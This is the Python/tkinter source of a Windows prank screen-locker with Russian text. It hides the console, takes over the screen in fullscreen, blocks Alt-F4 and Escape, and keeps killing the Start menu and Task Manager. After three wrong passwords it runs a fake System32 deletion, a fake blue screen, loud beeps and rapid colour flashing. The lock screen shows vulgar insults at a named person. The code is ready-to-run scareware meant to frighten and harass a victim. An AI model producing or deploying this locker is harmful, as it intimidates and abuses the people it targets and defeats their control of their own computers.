import tkinter as tk
import ctypes
import sys
import threading
import time
import random

PASSWORD = "123"
MAX_ATTEMPTS = 3

# Hide console
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Create window
root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)
root.configure(bg='black')

root.focus_force()
root.grab_set()

# Variables
attempts_left = MAX_ATTEMPTS
fake_deleting = False
stop_chaos = False

# ============= SOUNDS =============
def play_many_sounds():
    def beep_thread():
        for _ in range(20):
            if stop_chaos: break
            ctypes.windll.kernel32.Beep(random.randint(400, 2000), 100)
            time.sleep(0.05)
    
    def message_beep_thread():
        for _ in range(15):
            if stop_chaos: break
            ctypes.windll.user32.MessageBeep(0xFFFFFFFF)
            time.sleep(0.07)
    
    def console_beep():
        for _ in range(10):
            if stop_chaos: break
            print('\a', end='', flush=True)
            time.sleep(0.03)
    
    threading.Thread(target=beep_thread, daemon=True).start()
    threading.Thread(target=message_beep_thread, daemon=True).start()
    threading.Thread(target=console_beep, daemon=True).start()

# ============= CHAOS FLASH 10 SEC =============
def chaos_flash_10_seconds():
    colors = ["red", "blue", "green", "yellow", "purple", "orange", "cyan", "white", "#ff00ff", "#00ffff", "#ff6600"]
    
    start_time = time.time()
    beat_count = 0
    
    while time.time() - start_time < 10:
        color = random.choice(colors)
        root.configure(bg=color)
        
        for widget in [title_label, insult_label, lives_label, error_label]:
            try:
                widget.config(fg=random.choice(colors))
            except:
                pass
        
        root.update()
        ctypes.windll.kernel32.Beep(random.randint(200, 3000), 30)
        
        beat_count += 1
        if beat_count % 5 == 0:
            ctypes.windll.user32.MessageBeep(0xFFFFFFFF)
        
        time.sleep(0.05)
    
    for _ in range(10):
        root.configure(bg='red')
        root.update()
        ctypes.windll.kernel32.Beep(500, 100)
        time.sleep(0.1)
        root.configure(bg='black')
        root.update()
        ctypes.windll.kernel32.Beep(1000, 100)
        time.sleep(0.1)

# ============= FAKE DELETE =============
def fake_delete_windows():
    global fake_deleting, stop_chaos
    fake_deleting = True
    stop_chaos = False
    
    delete_window = tk.Toplevel(root)
    delete_window.attributes('-fullscreen', True)
    delete_window.attributes('-topmost', True)
    delete_window.overrideredirect(True)
    delete_window.configure(bg='black')
    
    tk.Label(
        delete_window,
        text="⚠️ ВНИМАНИЕ! ⚠️\n\nОБНАРУЖЕНА КРИТИЧЕСКАЯ ОШИБКА!\nЗАПУЩЕНО УДАЛЕНИЕ СИСТЕМНЫХ ФАЙЛОВ",
        font=("Arial", 28, "bold"),
        fg="#ff0000",
        bg="black"
    ).pack(pady=50)
    
    progress_canvas = tk.Canvas(delete_window, width=800, height=40, bg="#333", highlightthickness=2, highlightcolor="red")
    progress_canvas.pack(pady=30)
    progress_rect = progress_canvas.create_rectangle(0, 0, 0, 40, fill="#ff0000")
    
    percent_label = tk.Label(delete_window, text="0%", font=("Arial", 24, "bold"), fg="#ff0000", bg="black")
    percent_label.pack()
    
    status_label = tk.Label(delete_window, text="Удаление C:\\Windows\\System32...", font=("Arial", 16), fg="#ff6600", bg="black")
    status_label.pack(pady=10)
    
    files = [
        "ntoskrnl.exe", "winlogon.exe", "csrss.exe", "lsass.exe", "services.exe",
        "svchost.exe", "explorer.exe", "taskmgr.exe", "regedit.exe", "cmd.exe",
        "kernel32.dll", "user32.dll", "gdi32.dll", "advapi32.dll", "ole32.dll",
        "shell32.dll", "ntdll.dll", "msvcrt.dll", "ws2_32.dll", "winmm.dll"
    ]
    
    file_label = tk.Label(delete_window, text="", font=("Arial", 12), fg="#888", bg="black")
    file_label.pack(pady=20)
    
    def update_progress(percent):
        width = int(800 * percent / 100)
        progress_canvas.coords(progress_rect, 0, 0, width, 40)
        percent_label.config(text=f"{percent}%")
        delete_window.update()
        
        for _ in range(2):
            delete_window.configure(bg='red')
            time.sleep(0.02)
            delete_window.configure(bg='black')
            time.sleep(0.02)
    
    for percent in range(0, 101, 2):
        if stop_chaos: break
        update_progress(percent)
        
        if percent < 30:
            status_label.config(text="Удаление системных файлов...", fg="#ff6600")
        elif percent < 60:
            status_label.config(text="Деинсталляция ядра Windows...", fg="#ff3300")
        elif percent < 85:
            status_label.config(text="Стирание реестра и настроек...", fg="#ff0000")
        else:
            status_label.config(text="УНИЧТОЖЕНИЕ СИСТЕМЫ ЗАВЕРШАЕТСЯ...", fg="#ff0000")
        
        if percent % 10 == 0:
            file_label.config(text=f"Удален: {random.choice(files)}")
        
        if percent % 5 == 0:
            ctypes.windll.kernel32.Beep(random.randint(300, 1500), 50)
        
        time.sleep(0.05)
    
    if not stop_chaos:
        for i in range(10):
            delete_window.configure(bg='#0000aa')
            delete_window.update()
            ctypes.windll.kernel32.Beep(800, 80)
            time.sleep(0.1)
            delete_window.configure(bg='black')
            delete_window.update()
            time.sleep(0.1)
        
        bsod_window = tk.Toplevel(delete_window)
        bsod_window.attributes('-fullscreen', True)
        bsod_window.attributes('-topmost', True)
        bsod_window.overrideredirect(True)
        bsod_window.configure(bg='#0000aa')
        
        tk.Label(
            bsod_window,
            text=":(\n\nВАША СИСТЕМА БЫЛА УНИЧТОЖЕНА\n\nЗагрузка... отсутствует\n\nКод ошибки: 0xDEADBEEF",
            font=("Consolas", 24, "bold"),
            fg="white",
            bg="#0000aa"
        ).pack(expand=True)
        
        bsod_window.update()
        time.sleep(2)
        bsod_window.destroy()
    
    delete_window.destroy()
    chaos_flash_10_seconds()
    
    stop_chaos = True
    root.quit()
    root.destroy()
    sys.exit(0)

# ============= MAIN INTERFACE =============
title_label = tk.Label(
    root,
    text="🔒 ЗАБЛОКИРОВАНО 🔒\n\nMisha шлюха ебаная\n\nВВЕДИТЕ ПАРОЛЬ:",
    font=("Arial", 32, "bold"),
    fg="#ff0000",
    bg="black",
    justify="center"
)
title_label.pack(expand=True, pady=80)

insult_label = tk.Label(
    root,
    text="😂 хахаха litengirry хуесос 😂",
    font=("Arial", 20, "bold"),
    fg="#ff6600",
    bg="black"
)
insult_label.pack(pady=5)

lives_label = tk.Label(
    root,
    text=f"❤️ ЖИЗНИ: {attempts_left}/3",
    font=("Arial", 16, "bold"),
    fg="#ff0000",
    bg="black"
)
lives_label.pack(pady=5)

entry = tk.Entry(
    root,
    font=("Arial", 24),
    show="*",
    width=15,
    justify="center",
    bg="white",
    fg="black"
)
entry.pack(pady=20)
entry.focus_set()

error_label = tk.Label(root, text="", font=("Arial", 14), fg="orange", bg="black")
error_label.pack()

def check_password(event=None):
    global attempts_left
    
    if entry.get() == PASSWORD:
        root.destroy()
        sys.exit(0)
    else:
        attempts_left -= 1
        lives_label.config(text=f"💀 ЖИЗНИ: {attempts_left}/3 💀", fg="orange")
        
        for _ in range(5):
            root.configure(bg='red')
            root.update()
            time.sleep(0.05)
            root.configure(bg='black')
            root.update()
            time.sleep(0.05)
        
        if attempts_left <= 0:
            error_label.config(text="❌ 3 НЕВЕРНЫХ ПАРОЛЯ! АКТИВАЦИЯ КАРЫ... ❌")
            root.update()
            play_many_sounds()
            fake_delete_windows()
        else:
            error_label.config(text=f"❌ НЕВЕРНО! ОСТАЛОСЬ ЖИЗНЕЙ: {attempts_left} ❌")
        
        entry.delete(0, tk.END)
        entry.focus_set()

btn = tk.Button(root, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 14, "bold"), bg="#333", fg="#0f0", command=check_password)
btn.pack(pady=10)

entry.bind("<Return>", check_password)

def block_event(e):
    return "break"
root.bind("<Alt-F4>", block_event)
root.bind("<Escape>", block_event)

def secret_exit(e):
    root.destroy()
    sys.exit(0)
root.bind("<Alt-o>", secret_exit)
root.bind("<Alt-O>", secret_exit)

def animate_insult():
    colors = ["#ff6600", "#ff0000", "#ff00ff", "#ffff00", "#00ff00", "#00ffff", "#ff0066"]
    i = 0
    while True:
        try:
            insult_label.config(fg=colors[i % len(colors)])
            i += 1
        except:
            pass
        time.sleep(0.2)
threading.Thread(target=animate_insult, daemon=True).start()

def blink_title():
    while True:
        try:
            title_label.config(fg="#ff0000")
            time.sleep(0.3)
            title_label.config(fg="#990000")
            time.sleep(0.3)
        except:
            pass
threading.Thread(target=blink_title, daemon=True).start()

def block_win_key():
    while True:
        try:
            root.focus_force()
            root.grab_set()
            entry.focus_set()
            hwnd = ctypes.windll.user32.FindWindowW(None, "Меню «Пуск»")
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            hwnd = ctypes.windll.user32.FindWindowW(None, "Start")
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            ctypes.windll.user32.keybd_event(0x1B, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0x1B, 0, 2, 0)
        except:
            pass
        time.sleep(0.05)
threading.Thread(target=block_win_key, daemon=True).start()

def kill_taskmgr():
    while True:
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, "Диспетчер задач Windows")
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
            hwnd = ctypes.windll.user32.FindWindowW(None, "Task Manager")
            if hwnd:
                ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
        except:
            pass
        time.sleep(0.2)
threading.Thread(target=kill_taskmgr, daemon=True).start()

root.mainloop()